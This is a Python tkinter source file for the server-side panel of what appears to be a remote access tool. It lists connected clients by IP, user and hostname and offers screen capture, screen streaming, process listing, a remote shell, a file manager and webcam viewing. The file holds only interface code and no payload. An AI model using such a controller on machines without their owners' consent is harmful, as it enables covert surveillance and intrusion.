# server/gui/client_view.py
import tkinter as tk
from tkinter import ttk, messagebox
class ClientListPanel:
    def __init__(self, parent, request_screenshot_callback, request_process_list_callback, 
                request_shell_callback=None, request_file_manager_callback=None,
                request_webcam_callback=None, request_screen_stream_callback=None):
        self.request_screenshot = request_screenshot_callback
        self.request_process_list = request_process_list_callback
        self.request_shell = request_shell_callback
        self.request_file_manager = request_file_manager_callback
        self.request_webcam = request_webcam_callback
        self.request_screen_stream = request_screen_stream_callback
        self.frame = ttk.LabelFrame(parent, text="Clientes Conectados", padding=10)
        self.frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        self._create_client_treeview()
        self._create_context_menu()
    def _create_client_treeview(self):
        columns = ("IP", "Sistema", "Usuário", "Hostname", "CPU", "RAM", "Status")
        self.clients_tree = ttk.Treeview(self.frame, columns=columns, show="headings", selectmode="browse")
        for col in columns:
            self.clients_tree.heading(col, text=col)
        self.clients_tree.column("IP", width=120)
        self.clients_tree.column("Sistema", width=100)
        self.clients_tree.column("Usuário", width=100)
        self.clients_tree.column("Hostname", width=120)
        self.clients_tree.column("CPU", width=60)
        self.clients_tree.column("RAM", width=60)
        self.clients_tree.column("Status", width=80)
        scrollbar = ttk.Scrollbar(self.frame, orient=tk.VERTICAL, command=self.clients_tree.yview)
        self.clients_tree.configure(yscrollcommand=scrollbar.set)
        self.clients_tree.bind("<Button-3>", self._show_context_menu)
        self.clients_tree.bind("<Double-1>", lambda e: self.request_screenshot())
        self.clients_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    def _create_context_menu(self):
        self.context_menu = tk.Menu(self.clients_tree, tearoff=0)
        self.context_menu.add_command(label="Capturar tela", command=self.request_screenshot)
        self.context_menu.add_command(label="Stream Tela", command=self.request_screen_stream)
        self.context_menu.add_command(label="Ver processos", command=self.request_process_list)
        if self.request_shell:
            self.context_menu.add_separator()
            self.context_menu.add_command(label="Shell remota", command=self.request_shell)
        if self.request_file_manager:
            self.context_menu.add_command(label="Gerenciador de arquivos", command=self.request_file_manager)
        if self.request_webcam:
            self.context_menu.add_separator()
            self.context_menu.add_command(label="Visualizar webcam", command=self.request_webcam)
    def _show_context_menu(self, event):
        item = self.clients_tree.identify_row(event.y)
        if item:
            self.clients_tree.selection_set(item)
            self.context_menu.post(event.x_root, event.y_root)
    def update_client_list(self, clients=None):
        if clients is None:
            self.frame.after(0, lambda: self._update_client_list_ui())
        else:
            self._update_client_list_ui(clients)
    def _update_client_list_ui(self, clients=None):
        selected_ip_port = None
        selected_items = self.clients_tree.selection()
        if selected_items:
            selected_item = selected_items[0]
            item_values = self.clients_tree.item(selected_item, "values")
            if item_values:
                selected_ip_port = item_values[0]
        for item in self.clients_tree.get_children():
            self.clients_tree.delete(item)
        if clients is None:
            return
        selected_item_id = None
        for client_addr, client_info in clients.items():
            ip, port = client_addr
            client_ip_port = f"{ip}:{port}"
            values = (
                client_ip_port,
                client_info.get("os", "Desconhecido"),
                client_info.get("username", "Desconhecido"),
                client_info.get("hostname", "Desconhecido"),
                client_info.get("cpu_usage", "N/A"),
                client_info.get("ram_usage", "N/A"),
                "Conectado"
            )
            item_id = self.clients_tree.insert("", tk.END, values=values)
            if selected_ip_port and client_ip_port == selected_ip_port:
                selected_item_id = item_id
        if selected_item_id:
            self.clients_tree.selection_set(selected_item_id)
            self.clients_tree.see(selected_item_id)
    def get_selected_client_address(self, client_sockets):
        selected_item = self.clients_tree.selection()
        if not selected_item:
            messagebox.showinfo("Aviso", "Nenhum cliente selecionado.")
            return None
        item_values = self.clients_tree.item(selected_item[0], "values")
        client_ip_port = item_values[0]
        ip, port = client_ip_port.split(":")
        client_address = (ip, int(port))
        if client_address not in client_sockets:
            messagebox.showerror("Erro", "Cliente não está mais conectado.")
            return None
        return client_address
